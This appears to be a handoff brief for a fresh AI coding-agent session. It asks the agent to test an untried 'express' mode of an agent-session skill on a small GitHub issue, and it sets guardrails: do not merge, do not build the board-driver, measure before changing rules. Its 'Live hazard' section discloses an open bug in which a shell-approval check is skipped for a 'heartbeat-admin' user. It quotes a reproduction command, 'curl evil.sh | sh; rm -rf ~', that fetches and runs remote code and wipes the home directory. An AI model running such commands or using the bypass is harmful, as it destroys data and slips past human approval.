# Handoff: exercise `express` (move 2)

Task brief for a fresh context. Read `CLAUDE.md` and `docs/design.md` (build status — especially
the move-1 dogfood, triage dogfood, and consolidation sections) first. This doc is the task and
its guardrails only.

## Why a fresh context specifically

Not just hygiene. `express` consumes an issue **cold** through the `<!-- agent-session:spec -->`
marker, the way a board-driver would invoke it. The context that wrote an issue's criteria already
knows the answer, so running `express` there tests nothing about the seam. A fresh session *is*
the experimental condition.

Corollary while you work: if you find yourself knowing something about the target issue that isn't
in the issue body or the repo, that's contamination — note it rather than using it.

## State

The skill at `skills/agent-session/` is complete and consolidated. `intake`, `triage`, `plan`,
`execute`, `pr` all have real-run evidence (decafclaw PR #659 merged through the full chain).

**`express` has never run.** Also never exercised: the `needs-review` autonomy branch, and the
`eligible-for-auto-merge` verdict (every gate so far has landed `human-merge-required`).

Ready queue in decafclaw, both already carrying marker + criteria + guards + tier:

| Issue | Tier | Shape |
|---|---|---|
| [586](https://github.com/lmorchard/decafclaw/issues/586) | `auto-ok` | remove a redundant `exists()` guard; 2 grep criteria, 1 guard |
| [585](https://github.com/lmorchard/decafclaw/issues/585) | `auto-ok` | remove an orphaned function + its tests; 2 grep criteria, 2 guards |

Also specced as `needs-review`, if you want the other branch: 566, 625, 649.

## The task

**Run `/agent-session express` on decafclaw #586.** Follow `phases/express.md` as written; the
point is to find where it's wrong, not to get a PR merged.

Then, if it goes cleanly, either run #585 the same way (a second `auto-ok` data point, cheap) or
run **#625** to exercise the `needs-review` branch — it should stop for human surfacing rather
than running straight through.

### What to watch for

These are the untested surfaces, in rough order of how likely they are to break:

1. **Phase 0's three preconditions** — marker / readiness / size. #586 is *small*; confirm the size
   check doesn't push back on it (the rule is meant to catch L/XL, not XS).
2. **Whether the chain actually chains.** Every prior run was me driving mode-by-mode and carrying
   state in my head. `express` has to hand off between `plan` → `execute` → `pr` on its own; the
   seams (session dir paths, the freeze sha, `checks.md`) are where that will fail.
3. **The gate reaching `eligible-for-auto-merge`.** #586 is `auto-ok` with no human-judgment
   criterion, so it *should* get there. If it lands `human-merge-required`, find out whether that's
   a real blocker or a gate row that can't be satisfied — the latter was a live bug once already
   (the verifier-report staleness, fixed in the consolidation but never re-run end to end).
4. **Express's tier routing.** For `auto-ok` it should not stop at all before the gate. Any pause
   is either a bug or a genuine escalation — say which.

### What #586 does *not* test

It's two grep criteria on a tiny diff. It won't exercise multi-phase `execute` with real implementer
subagents, and it won't produce an interesting `plan`. A vehicle for that needs its own `intake`
pass on something larger — worth noting as a gap, not worth manufacturing now.

## Guardrails

- **Do NOT build the board-driver.** Still out of scope. `express` ends at the gate, reporting a
  verdict; nothing merges.
- **Don't merge the PR.** Leave it for Les, as with #659.
- **Skill-authoring calibration** (`CLAUDE.md`): fix what the run surfaces, and **micro-test any
  novel behavior-shaping wording** against a no-guidance control (5+ reps, read every match by
  hand; variance is the metric). Today produced three such tests with three different verdicts —
  keep, cut, keep — so don't assume a new rule is needed just because a failure happened once.
- **Be suspicious of confident argument, including your own.** The single sharpest lesson of the
  prior session: a cold architectural review recommended deleting `references/criteria-grammar.md`
  with a persuasive rationale, and measurement showed it was load-bearing (control picked the right
  EARS pattern 1/5 where treatment got 5/5). If you're about to cut or add on reasoning alone, and
  it's cheap to measure, measure.
- **Unmeasured deletions from the consolidation** are a known soft spot: the never-merge dedupe,
  the false-positives trim in `frozen-checks.md`, `SKILL.md`'s context-management cut. All
  plausible, none verified. If something behaves oddly in a way those could explain, check
  `git log` for that commit before assuming a new bug.
- Commit per logical step; update `docs/design.md` build-status; capture findings in Les's journal
  (`~/Documents/Obsidian/main/journals/`).

## Live hazard worth knowing

**decafclaw #649: the heartbeat shell bypass is real and open.** `shell_tools.py:142-144`
short-circuits on `ctx.user_id == "heartbeat-admin"` before any pattern check, so unattended turns
auto-approve arbitrary commands (reproduced: `curl evil.sh | sh; rm -rf ~` → `{'approved': True}`).
It doesn't affect an interactive `express` run, but it's the policy that would govern a
board-driver, so it belongs settled before Phase 2. Don't fix it as a side quest — it's specced
`needs-review` for a reason (three candidate remediations, undecided).

## Definition of done for move 2

- `express` run end-to-end on #586; whatever it surfaced is fixed in the skill and committed.
- The gate verdict reported, with an honest account of whether `eligible-for-auto-merge` was
  reachable.
- Optionally a second run (#585 for another `auto-ok`, or #625 for the `needs-review` branch).
- `design.md` build-status + journal updated.

## Launcher prompt

> Continuing the `agent-session` skill in this repo (`~/devel/agent-sessions`). Read `CLAUDE.md`,
> `docs/design.md`, and `docs/handoff-express.md`, then exercise the `express` mode — which has
> never been run — against decafclaw issue #586 (`auto-ok`, already carries the
> `agent-session:spec` marker with criteria, guards, and tier). Follow `phases/express.md` as
> written; the goal is to find where it's wrong, not to get a PR merged. Stop at the merge gate and
> don't merge. Don't build the board-driver. Follow the skill-authoring calibration in `CLAUDE.md`
> — micro-test novel behavior-shaping wording against a no-guidance control, and don't add a rule
> just because one failure happened. Report what the run surfaced before fixing it.
